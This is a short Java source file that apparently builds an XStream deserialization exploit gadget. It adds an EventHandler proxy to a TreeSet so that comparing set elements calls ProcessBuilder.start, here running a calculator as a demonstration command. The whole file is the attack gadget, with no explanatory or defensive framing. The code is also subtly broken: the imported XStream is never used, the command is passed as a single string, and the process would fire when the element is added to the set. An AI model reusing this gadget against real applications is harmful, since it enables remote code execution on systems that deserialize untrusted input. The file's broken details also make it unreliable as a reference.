import com.thoughtworks.xstream.XStream;

import java.beans.EventHandler;
import java.util.Set;
import java.util.TreeSet;

/**
 *
 * */

public class EventHandlerPayload {

    public static void main(String[] args) {
        String xml = geneEvenePayload().toString();
        System.out.println(xml);
    }

    public static Set<Comparable> geneEvenePayload() {
        Set<Comparable> set = new TreeSet<Comparable>();
        set.add("foo");
        set.add(EventHandler.create(Comparable.class, new ProcessBuilder("open -a calculator"), "start"));
        return set;
    }
}
